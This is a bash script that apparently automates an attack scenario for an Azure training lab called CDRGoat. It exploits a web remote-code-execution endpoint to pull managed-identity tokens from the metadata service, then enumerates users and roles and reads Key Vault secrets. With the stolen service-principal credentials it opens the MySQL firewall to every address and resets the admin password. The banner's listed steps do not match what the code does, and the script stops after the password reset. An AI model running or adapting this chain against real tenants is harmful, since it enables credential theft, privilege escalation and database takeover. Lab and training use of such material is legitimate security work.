#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===          CDRGoat Azure - Scenario 1              ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Exploitation of Web RCE, metadata stealing on VMa\n"
  printf "  • Step 2. Permission enumeration for stolen metadata\n"
  printf "  • Step 3. Access gathering to VMb via uploading new sshkey\n"
  printf "  • Step 4. Stealing credentials to access RDS\n"
  printf "  • Step 5. Accessing sensitive data in RDS\n"
}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in curl jq mysql; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true

#############################################
# Step 1. Exploitation of Web RCE, metadata stealing
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploitation of Web RCE, metadata stealing  ===" "${RESET}"
is_valid_ipv4() {
  local ip="$1" o1 o2 o3 o4
  [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
  IFS='.' read -r o1 o2 o3 o4 <<<"$ip"
  for o in "$o1" "$o2" "$o3" "$o4"; do
    [[ $o =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || return 1
  done
  return 0
}

# ---- Prompt + IP format validation loop (keeps asking until valid) ----
step "Target selection"
while :; do
  read -r -p "Enter IP of vulnerable application: " TARGET_IP
  if is_valid_ipv4 "$TARGET_IP"; then
    ok "IP format looks valid: $TARGET_IP"
    break
  else
    err "Invalid IPv4 address. Expected dotted quad (e.g., 203.0.113.10). Try again."
  fi
done

TARGET_URL="http://$TARGET_IP/cmd"
info "Target endpoint: $TARGET_URL"

# ---- Connectivity check: require HTTP 200 on /cmd?c=id ----
step "Probing $TARGET_URL for RCE reachability (expects HTTP 200)"
spin_start "Sending test request (c=id)"
set +e
HTTP_CODE="$(curl -sS -m 8 --connect-timeout 4 -o /dev/null -w "%{http_code}" \
                  -G --data-urlencode c=id "$TARGET_URL")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "curl failed (exit $CURL_RC). Check SG/NACL/route/DNS."
  exit 1
fi
if [ "$HTTP_CODE" != "200" ]; then
  err "Endpoint responded with HTTP $HTTP_CODE (expected 200). Aborting."
  exit 1
fi
ok "RCE endpoint reachable (HTTP 200) — proceeding."

step "Verification of exploitation: $TARGET_URL?c=id"
ok "$(curl -sG $TARGET_URL?c=id)"

step "Fetching Azure Management Token from metadata via remote RCE"
spin_start "Requesting Azure access token (resource=management.azure.com)"

read -r -d '' PAYLOAD <<'EOF' || true
/usr/bin/env bash -lc '
curl -s -H "Metadata:true" \
"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com&api-version=2018-02-01"
'
EOF

# send the payload to /cmd using --data-urlencode to preserve quoting
set +e
AZURETOKEN_JSON="$(curl -sS -m 12 --connect-timeout 6 -G --data-urlencode "c@-" "$TARGET_URL" <<<"$PAYLOAD")"
CURL_RC=$?
set -e
spin_stop

# Extract token value
AzureToken="$(echo "$AZURETOKEN_JSON" | jq -r '.access_token')"

if [ -z "$AzureToken" ] || [ "$AzureToken" = "null" ]; then
  err "Failed to extract Azure access token"
  exit 1
fi

ok "Azure Management Token extracted successfully"

step "Extracting identifiers from AzureToken JWT"

# Extract JWT payload
AzureTokenPayload="$(echo "$AzureToken" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"

# Parse values
TenantID="$(echo "$AzureTokenPayload" | jq -r '.tid')"
MirID="$(echo "$AzureTokenPayload" | jq -r '.xms_mirid')"
OID="$(echo "$AzureTokenPayload" | jq -r '.oid')"

# Validate values
if [ -z "$TenantID" ] || [ -z "$MirID" ] || [ "$TenantID" = "null" ] || [ "$MirID" = "null" ]; then
  err "Failed to extract 'tid' or 'xms_mirid' from token"
  exit 1
fi

# Parse xms_mirid (Azure Resource ID path)
# Example format:
# /subscriptions/<sub_id>/resourcegroups/<rg_name>/providers/<provider>/<res_type>/<asset_name>

SubscriptionID="$(echo "$MirID" | cut -d'/' -f3)"
ResourceGroup="$(echo "$MirID" | cut -d'/' -f5)"
AssetName="$(echo "$MirID" | rev | cut -d'/' -f1 | rev)"

info "Extracted from AzureToken:"
printf "  • Tenant ID        : %s\n" "${YELLOW}${TenantID}${RESET}"
printf "  • Subscription ID  : %s\n" "${YELLOW}${SubscriptionID}${RESET}"
printf "  • Resource Group   : %s\n" "${YELLOW}${ResourceGroup}${RESET}"
printf "  • Asset Name       : %s\n" "${YELLOW}${AssetName}${RESET}"
printf "  • Object ID        : %s\n" "${YELLOW}${OID}${RESET}"

# GraphToken
step "Fetching Microsoft Graph Token from metadata via remote RCE"
spin_start "Requesting Graph access token (resource=graph.microsoft.com)"

read -r -d '' GRAPH_PAYLOAD <<'EOF' || true
/usr/bin/env bash -lc '
curl -s -H "Metadata:true" \
"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com&api-version=2018-02-01"
'
EOF

# Send to the same /cmd endpoint
set +e
GRAPHTOKEN_JSON="$(curl -sS -m 12 --connect-timeout 6 -G --data-urlencode "c@-" "$TARGET_URL" <<<"$GRAPH_PAYLOAD")"
CURL_RC=$?
set -e
spin_stop

# Extract token
GraphToken="$(echo "$GRAPHTOKEN_JSON" | jq -r '.access_token')"

if [ -z "$GraphToken" ] || [ "$GraphToken" = "null" ]; then
  err "Failed to extract Microsoft Graph token"
  exit 1
fi

ok "Graph Token extracted successfully"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We exploited a Remote Code Execution (RCE) vulnerability in the web application\n"
printf "to access the Azure Instance Metadata Service (IMDS) at 169.254.169.254.\n\n"
printf "From IMDS, we obtained two OAuth access tokens:\n"
printf "  • ${MAGENTA}Azure Management Token${RESET}: Grants access to Azure Resource Manager APIs\n"
printf "  • ${MAGENTA}Microsoft Graph Token${RESET}: Grants access to Azure AD/Entra ID APIs\n\n"
printf "These tokens inherit the permissions of the VM's Managed Identity.\n"
printf "The Managed Identity is a first-class Azure AD principal, meaning it can\n"
printf "have RBAC roles and Graph API permissions just like a user or service principal.\n\n"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2: Permission enumeration for stolen metadata
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for stolen metadata  ===\n" "${RESET}"

# ------ Enum users

step "Enumerating Azure AD users using GraphToken"
spin_start "Sending Graph API request to /v1.0/users"

set +e
GRAPH_USERS_JSON="$(curl -sS -H "Authorization: Bearer $GraphToken" \
    "https://graph.microsoft.com/v1.0/users")"
CURL_RC=$?
set -e
spin_stop

# Check and parse
if [ $CURL_RC -ne 0 ]; then
  err "Failed to call Microsoft Graph API (curl exit $CURL_RC)"
  exit 1
fi

# Check for error in JSON
if echo "$GRAPH_USERS_JSON" | jq -e '.error' >/dev/null 2>&1; then
  msg="$(echo "$GRAPH_USERS_JSON" | jq -r '.error.message')"
  err "Graph API error: $msg"
fi

# ------ Enum resources

step "Enumerating Azure resources using AzureToken"
spin_start "Requesting list of resources from Azure ARM API"

# Replace with previously extracted Subscription ID
if [ -z "$SubscriptionID" ]; then
  err "SubscriptionID is not set. Cannot enumerate resources."
  exit 1
fi

set +e
RESOURCE_LIST_JSON="$(curl -sS -H "Authorization: Bearer $AzureToken" \
    "https://management.azure.com/subscriptions/${SubscriptionID}/resources?api-version=2022-12-01")"
CURL_RC=$?
set -e
spin_stop

# Check for errors
if [ $CURL_RC -ne 0 ]; then
  err "Failed to call Azure ARM API (curl rc=$CURL_RC)"
  exit 1
fi

if echo "$RESOURCE_LIST_JSON" | jq -e '.error' >/dev/null 2>&1; then
  msg="$(echo "$RESOURCE_LIST_JSON" | jq -r '.error.message')"
  err "ARM API error: $msg"
  exit 1
fi

# Parse and display summary
RESOURCE_COUNT="$(echo "$RESOURCE_LIST_JSON" | jq '.value | length')"
ok "Retrieved $RESOURCE_COUNT resources in subscription ${SubscriptionID}"

echo "$RESOURCE_LIST_JSON" | jq -r --arg YELLOW "$YELLOW" --arg RESET "$RESET" \
  '.value[] | "  • [\(.type)] \($YELLOW)\(.name)\($RESET)"'

# ------ Enum permissions

step "Enumerating role assignments (Get-AzRoleAssignment analog with name resolution and identity correlation)"
spin_start "Requesting role assignments for subscription $SubscriptionID"

set +e
ROLE_ASSIGNMENTS_JSON="$(curl -sS -H "Authorization: Bearer $AzureToken" \
  "https://management.azure.com/subscriptions/${SubscriptionID}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to call roleAssignments API (curl rc=$CURL_RC)"
  exit 1
fi

if echo "$ROLE_ASSIGNMENTS_JSON" | jq -e '.error' >/dev/null 2>&1; then
  msg="$(echo "$ROLE_ASSIGNMENTS_JSON" | jq -r '.error.message')"
  err "Role assignment API error: $msg"
  exit 1
fi

ROLE_COUNT="$(echo "$ROLE_ASSIGNMENTS_JSON" | jq '.value | length')"
ok "Found $ROLE_COUNT role assignments in the subscription"

# Extract unique roleDefinitionIds and principalIds
ROLE_IDS=($(echo "$ROLE_ASSIGNMENTS_JSON" | jq -r '.value[].properties.roleDefinitionId | split("/")[-1]' | sort -u))
PRINCIPAL_IDS=($(echo "$ROLE_ASSIGNMENTS_JSON" | jq -r '.value[].properties.principalId' | sort -u))

# Resolve Role ID → Role Name
declare -A ROLE_NAMES
for role_id in "${ROLE_IDS[@]}"; do
  role_name=$(curl -sS -H "Authorization: Bearer $AzureToken" \
    "https://management.azure.com/subscriptions/${SubscriptionID}/providers/Microsoft.Authorization/roleDefinitions/${role_id}?api-version=2022-04-01" \
    | jq -r '.properties.roleName // "Unknown Role"')
  ROLE_NAMES[$role_id]="$role_name"
done

# Resolve Principal ID → Display Name via Microsoft Graph
declare -A PRINCIPAL_NAMES
GRAPH_RESOLVE_PAYLOAD=$(jq -n --argjson ids "$(printf '%s\n' "${PRINCIPAL_IDS[@]}" | jq -R . | jq -s .)" '{ids: $ids}')
GRAPH_LOOKUP_RESP=$(curl -sS -X POST -H "Authorization: Bearer $GraphToken" -H "Content-Type: application/json" \
  -d "$GRAPH_RESOLVE_PAYLOAD" \
  "https://graph.microsoft.com/v1.0/directoryObjects/getByIds")

if echo "$GRAPH_LOOKUP_RESP" | jq -e '.value' >/dev/null 2>&1; then
  for row in $(echo "$GRAPH_LOOKUP_RESP" | jq -c '.value[]'); do
    pid=$(echo "$row" | jq -r '.id')
    name=$(echo "$row" | jq -r '.userPrincipalName // .displayName // "Unknown Principal"')
    PRINCIPAL_NAMES[$pid]="$name"
  done
else
  err "Graph API response did not contain any resolvable principal data (maybe due to permissions)"
fi

# Pretty print each role assignment with [YOU] tag
echo "$ROLE_ASSIGNMENTS_JSON" | jq -c '.value[]' | while read -r entry; do
  principal_id=$(echo "$entry" | jq -r '.properties.principalId')
  role_id=$(echo "$entry" | jq -r '.properties.roleDefinitionId | split("/")[-1]')
  scope=$(echo "$entry" | jq -r '.properties.scope')

  role_name="${ROLE_NAMES[$role_id]}"
  principal_name="${PRINCIPAL_NAMES[$principal_id]:-Unknown Principal}"

  if [ "$principal_id" = "$OID" ]; then
    printf "  • Principal: %s%s%s (%s) %s\n" "$GREEN" "$AssetName" "$RESET" "$principal_id" "[YOU]"
  else
    printf "  • Principal: %s%s%s (%s)\n" "$YELLOW" "$principal_name" "$RESET" "$principal_id"
  fi

  printf "    Role     : %s%s%s (%s)\n" "$YELLOW" "$role_name" "$RESET" "$role_id"
  printf "    Scope    : %s\n\n" "$scope"
done

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We enumerated the Azure RBAC permissions assigned to the stolen Managed Identity.\n"
printf "The identity has ${YELLOW}Reader${RESET} role on Key Vault resources.\n\n"
printf "Azure Key Vault supports two authorization models:\n"
printf "  • ${MAGENTA}Vault Access Policy${RESET} (legacy): Explicit policies per principal\n"
printf "  • ${MAGENTA}Azure RBAC${RESET} (modern): Standard role assignments\n\n"
printf "With Reader access to the vault, we can list secrets metadata.\n"
printf "If the vault uses RBAC and grants 'Key Vault Secrets User' to the MI,\n"
printf "we can also read secret values directly.\n\n"
printf "Next step: Obtain a vault-scoped token and enumerate vault contents.\n\n"

read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Accessing Azure Key Vault and exfiltrating secrets
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Accessing Azure Key Vault secrets via RBAC  ===" "${RESET}"

step "Identifying Key Vaults in subscription"
spin_start "Filtering resources for type Microsoft.KeyVault/vaults"

AZURE_RESOURCES_JSON="$RESOURCE_LIST_JSON"
vault_name="$(echo "$AZURE_RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.KeyVault/vaults") | .name')"

spin_stop

if [ -z "$vault_name" ]; then
  err "No Key Vaults found in the subscription"
  exit 0
fi

ok "Found Key Vault: ${YELLOW}${vault_name}${RESET}"

# 1. Get vault properties
spin_start "Requesting vault properties for $vault_name"
VAULT_INFO=$(curl -sS -H "Authorization: Bearer $AzureToken" \
  "https://management.azure.com/subscriptions/${SubscriptionID}/resourceGroups/${ResourceGroup}/providers/Microsoft.KeyVault/vaults/${vault_name}?api-version=2023-02-01")
spin_stop

VAULT_URI="$(echo "$VAULT_INFO" | jq -r '.properties.vaultUri')"

if [ -z "$VAULT_URI" ] || [ "$VAULT_URI" = "null" ]; then
  err "Failed to get vault URI for $vault_name"
  exit 1
fi

# 2. Get token scoped for vault.azure.net
spin_start "Getting token from IMDS for resource=vault.azure.net"

read -r -d '' VAULT_TOKEN_PAYLOAD <<'EOF' || true
/usr/bin/env bash -lc '
curl -s -H "Metadata:true" \
"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net&api-version=2018-02-01"
'
EOF

set +e
VaultToken_JSON="$(curl -sS -m 10 --connect-timeout 5 -G --data-urlencode "c@-" "$TARGET_URL" <<<"$VAULT_TOKEN_PAYLOAD")"
CURL_RC=$?
set -e
spin_stop

VaultToken="$(echo "$VaultToken_JSON" | jq -r '.access_token')"

if [ -z "$VaultToken" ] || [ "$VaultToken" = "null" ]; then
  err "Failed to obtain token for vault access"
  exit 1
fi

# 3. List secrets (metadata only)
step "Enumerating secrets in ${vault_name}"
spin_start "Querying secrets list from $vault_name"

set +e
SECRETS_JSON=$(curl -sS -H "Authorization: Bearer $VaultToken" \
  "${VAULT_URI}secrets?api-version=7.4")
CURL_RC=$?
set -e
spin_stop

if echo "$SECRETS_JSON" | jq -e '.error' >/dev/null 2>&1; then
  msg=$(echo "$SECRETS_JSON" | jq -r '.error.message')
  err "Vault access failed: $msg"
  exit 1
fi

SECRET_COUNT=$(echo "$SECRETS_JSON" | jq '.value | length')

if [ "$SECRET_COUNT" -eq 0 ]; then
  info "No secrets found in $vault_name"
  exit 0
fi

ok "Found ${SECRET_COUNT} secrets in ${vault_name}"

# 4. Try reading secret values
PivotClientID=""
PivotClientSecret=""

SECRET_URIS=($(echo "$SECRETS_JSON" | jq -r '.value[].id'))

for secret_uri in "${SECRET_URIS[@]}"; do
  secret_name=$(basename "$secret_uri")
  spin_start "Sending GET for secret value"
  set +e
  SECRET_VAL_JSON=$(curl -sS -H "Authorization: Bearer $VaultToken" \
    "${VAULT_URI}secrets/${secret_name}?api-version=7.4")
  CURL_RC=$?
  set -e
  spin_stop

  if echo "$SECRET_VAL_JSON" | jq -e '.value' >/dev/null 2>&1; then
    value=$(echo "$SECRET_VAL_JSON" | jq -r '.value')
    info "Secret value (${YELLOW}${secret_name}${RESET}): ${MAGENTA}${value}${RESET}"

    # Store for next step
    if [[ "$secret_name" == *client-id* ]]; then
      PivotClientID="$value"
    elif [[ "$secret_name" == *client-secret* ]]; then
      PivotClientSecret="$value"
    fi
  else
    msg=$(echo "$SECRET_VAL_JSON" | jq -r '.error.message // "No permission or not found"')
    err "Unable to read secret '${secret_name}': $msg"
  fi
done

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We successfully accessed Azure Key Vault and exfiltrated stored secrets.\n\n"
printf "Key Vault is commonly used by organizations to store:\n"
printf "  • Service Principal credentials (client ID + secret)\n"
printf "  • API keys and connection strings\n"
printf "  • Certificates and encryption keys\n"
printf "  • Database passwords\n\n"
printf "We discovered Service Principal credentials stored in the vault.\n"
printf "These credentials allow us to ${MAGENTA}pivot${RESET} to a different identity\n"
printf "with potentially broader permissions than the original Managed Identity.\n\n"

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 4. Pivot using stolen Service Principal credentials
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Pivot using stolen Service Principal credentials  ===" "${RESET}"

# Sanity check: stolen credentials
if [ -z "${PivotClientID:-}" ] || [ -z "${PivotClientSecret:-}" ]; then
  err "PivotClientID / PivotClientSecret not set — no credentials to pivot with"
  exit 1
fi

# 1. Get Azure Management token (client_credentials)
step "Authenticating to Azure using stolen Service Principal"
spin_start "Requesting Azure Management token"

set +e
PIVOT_AZURE_TOKEN_JSON="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${PivotClientID}&client_secret=${PivotClientSecret}&grant_type=client_credentials&resource=https://management.azure.com" \
  "https://login.microsoftonline.com/${TenantID}/oauth2/token")"
CURL_RC=$?
set -e
spin_stop

PivotAzureToken="$(echo "$PIVOT_AZURE_TOKEN_JSON" | jq -r '.access_token')"

if [ $CURL_RC -ne 0 ] || [ -z "$PivotAzureToken" ] || [ "$PivotAzureToken" = "null" ]; then
  err "Failed to authenticate using stolen Service Principal"
  echo "$PIVOT_AZURE_TOKEN_JSON" | jq .
  exit 1
fi

ok "Authenticated successfully as stolen Service Principal"

# 2. Analyze pivot JWT
step "Analyzing pivot Azure token (JWT)"

PivotPayload="$(echo "$PivotAzureToken" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"
PivotTenantID="$(echo "$PivotPayload" | jq -r '.tid')"
PivotOID="$(echo "$PivotPayload" | jq -r '.oid')"

info "Extracted from pivot token:"
printf "  • Tenant ID        : %s%s%s\n" "$YELLOW" "$PivotTenantID" "$RESET"
printf "  • Object ID        : %s%s%s\n" "$YELLOW" "$PivotOID" "$RESET"

# 3. Enumerate Azure AD users (Graph)
step "Enumerating Azure AD users using pivot identity"
spin_start "Requesting Graph token"

set +e
PIVOT_GRAPH_TOKEN_JSON="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${PivotClientID}&client_secret=${PivotClientSecret}&grant_type=client_credentials&resource=https://graph.microsoft.com" \
  "https://login.microsoftonline.com/${TenantID}/oauth2/token")"
set -e
spin_stop

PivotGraphToken="$(echo "$PIVOT_GRAPH_TOKEN_JSON" | jq -r '.access_token')"

if [ -z "$PivotGraphToken" ] || [ "$PivotGraphToken" = "null" ]; then
  err "Graph access denied for pivot identity"
else
  ok "Graph token acquired"

  GRAPH_USERS_JSON="$(curl -sS -H "Authorization: Bearer $PivotGraphToken" \
    "https://graph.microsoft.com/v1.0/users")"

  if echo "$GRAPH_USERS_JSON" | jq -e '.error' >/dev/null 2>&1; then
    msg="$(echo "$GRAPH_USERS_JSON" | jq -r '.error.message')"
    err "Graph enumeration failed: $msg"
  else
    USER_COUNT="$(echo "$GRAPH_USERS_JSON" | jq '.value | length')"
    ok "Enumerated $USER_COUNT Azure AD users with pivot identity"
  fi
fi

# 4. Enumerate Azure resources (ARM)
step "Enumerating Azure resources using pivot identity"
spin_start "Calling ARM resources API"

set +e
PIVOT_RESOURCES_JSON="$(curl -sS -H "Authorization: Bearer $PivotAzureToken" \
  "https://management.azure.com/subscriptions/${SubscriptionID}/resources?api-version=2022-12-01")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to enumerate resources with pivot identity"
  exit 1
fi

RES_COUNT="$(echo "$PIVOT_RESOURCES_JSON" | jq '.value | length')"
ok "Retrieved $RES_COUNT resources using pivot identity"

echo "$PIVOT_RESOURCES_JSON" | jq -r --arg YELLOW "$YELLOW" --arg RESET "$RESET" \
  '.value[] | "  • [\(.type)] \($YELLOW)\(.name)\($RESET)"'

# 5. Enumerate role assignments (pivot identity)
step "Enumerating role assignments using pivot identity"
spin_start "Querying roleAssignments API"

set +e
PIVOT_ROLE_JSON="$(curl -sS -H "Authorization: Bearer $PivotAzureToken" \
  "https://management.azure.com/subscriptions/${SubscriptionID}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to enumerate role assignments with pivot identity"
  exit 1
fi

ROLE_COUNT="$(echo "$PIVOT_ROLE_JSON" | jq '.value | length')"
ok "Found $ROLE_COUNT role assignments using pivot identity"

echo "$PIVOT_ROLE_JSON" | jq -c --arg OID "$PivotOID" '.value[] | select(.properties.principalId == $OID)' | while read -r entry; do
  scope=$(echo "$entry" | jq -r '.properties.scope')
  full_role_id=$(echo "$entry" | jq -r '.properties.roleDefinitionId')
  role_guid=$(basename "$full_role_id")

  # Resolve role name using the PivotToken
  role_name=$(curl -sS -H "Authorization: Bearer $AzureToken" \
    "https://management.azure.com/subscriptions/${SubscriptionID}/providers/Microsoft.Authorization/roleDefinitions/${role_guid}?api-version=2022-04-01" \
    | jq -r '.properties.roleName // "Unknown Role"')

  printf "  • Role     : %s%s%s (%s)\n" "$YELLOW" "$role_name" "$RESET" "$role_guid"
  printf "  • Scope    : %s\n\n" "$scope"
done

MYSQL_SERVER_NAME="$(echo "$PIVOT_RESOURCES_JSON" \
  | jq -r '.value[] | select(.type=="Microsoft.DBforMySQL/flexibleServers") | .name')"

MYSQL_RG="$(echo "$PIVOT_RESOURCES_JSON" \
  | jq -r '.value[] | select(.type=="Microsoft.DBforMySQL/flexibleServers") 
           | .id | split("/") | .[4]')"

if [ -z "$MYSQL_SERVER_NAME" ] || [ "$MYSQL_SERVER_NAME" = "null" ]; then
  err "Failed to extract MySQL server name"
  exit 1
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We pivoted to a Service Principal with an interesting permission combination\n"
printf "on the Azure MySQL Flexible Server resource:\n\n"
printf "  • ${YELLOW}Reader${RESET} role: Enumerate server configuration, FQDN, admin username,\n"
printf "    and current firewall rules (reconnaissance)\n\n"
printf "  • ${YELLOW}Contributor${RESET} role: Modify server configuration including:\n"
printf "    - Reset administrator password\n"
printf "    - Add/modify firewall rules\n"
printf "    - Change network access settings\n\n"
printf "This is a classic ${MAGENTA}control plane abuse${RESET} scenario:\n"
printf "Azure RBAC permissions on a resource allow modifying security controls\n"
printf "that protect the data plane (the database itself).\n\n"
printf "Next: Use Contributor access to expose the database and reset credentials.\n\n"

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 5. MySQL Flexible Server takeover (control plane abuse)
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. MySQL Flexible Server exposure & takeover  ===" "${RESET}"

step "Reading MySQL server configuration"
spin_start "Querying MySQL Flexible Server properties"

MYSQL_INFO_JSON="$(curl -sS -H "Authorization: Bearer $PivotAzureToken" \
  "https://management.azure.com/subscriptions/${SubscriptionID}/resourceGroups/${MYSQL_RG}/providers/Microsoft.DBforMySQL/flexibleServers/${MYSQL_SERVER_NAME}?api-version=2023-06-01-preview")"

spin_stop

if echo "$MYSQL_INFO_JSON" | jq -e '.error' >/dev/null 2>&1; then
  err "Failed to read MySQL server info"
  echo "$MYSQL_INFO_JSON" | jq .
  exit 1
fi

MYSQL_FQDN="$(echo "$MYSQL_INFO_JSON" | jq -r '.properties.fullyQualifiedDomainName')"
MYSQL_ADMIN="$(echo "$MYSQL_INFO_JSON" | jq -r '.properties.administratorLogin')"

ok "MySQL server info retrieved"
printf "  • FQDN           : %s%s%s\n" "$YELLOW" "$MYSQL_FQDN" "$RESET"
printf "  • Admin username : %s%s%s\n" "$YELLOW" "$MYSQL_ADMIN" "$RESET"

step "Enumerating MySQL firewall rules"
spin_start "Requesting firewall rules"

MYSQL_FW_JSON="$(curl -sS -H "Authorization: Bearer $PivotAzureToken" \
  "https://management.azure.com/subscriptions/${SubscriptionID}/resourceGroups/${MYSQL_RG}/providers/Microsoft.DBforMySQL/flexibleServers/${MYSQL_SERVER_NAME}/firewallRules?api-version=2023-06-01-preview")"

spin_stop

RULE_COUNT="$(echo "$MYSQL_FW_JSON" | jq '.value | length')"
ok "Found $RULE_COUNT firewall rules"

echo "$MYSQL_FW_JSON" | jq -r \
  '.value[] | "  • \(.name): \(.properties.startIpAddress) - \(.properties.endIpAddress)"'

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The MySQL Flexible Server currently has ${YELLOW}no firewall rules${RESET},\n"
printf "meaning the database is effectively private (no external access).\n\n"
printf "With Contributor permissions, we can:\n"
printf "  1. Add a permissive firewall rule (0.0.0.0 - 255.255.255.255)\n"
printf "     to allow connections from any IP address\n"
printf "  2. Reset the administrator password to credentials we control\n\n"
printf "This demonstrates how ${MAGENTA}Azure RBAC overpermissioning${RESET} can lead to\n"
printf "complete database compromise without any data plane credentials.\n\n"

read -r -p "Press Enter to proceed with database exposure (or Ctrl+C to abort)..." _ || true

step "Adding permissive firewall rule (0.0.0.0 - 255.255.255.255)"
spin_start "Creating AllowAll firewall rule"

curl -sS -X PUT \
  -H "Authorization: Bearer $PivotAzureToken" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SubscriptionID}/resourceGroups/${MYSQL_RG}/providers/Microsoft.DBforMySQL/flexibleServers/${MYSQL_SERVER_NAME}/firewallRules/AllowAll?api-version=2023-06-01-preview" \
  -d '{
    "properties": {
      "startIpAddress": "0.0.0.0",
      "endIpAddress": "255.255.255.255"
    }
  }' >/dev/null

spin_stop
ok "Firewall updated — MySQL is now internet-accessible"

step "Resetting MySQL admin password"
spin_start "Updating administrator password"

NEW_DB_PASSWORD="$(openssl rand -base64 18)"

curl -sS -X PATCH \
  -H "Authorization: Bearer $PivotAzureToken" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SubscriptionID}/resourceGroups/${MYSQL_RG}/providers/Microsoft.DBforMySQL/flexibleServers/${MYSQL_SERVER_NAME}?api-version=2023-06-01-preview" \
  -d "{
    \"properties\": {
      \"administratorLoginPassword\": \"${NEW_DB_PASSWORD}\"
    }
  }" >/dev/null
sleep 60
spin_stop

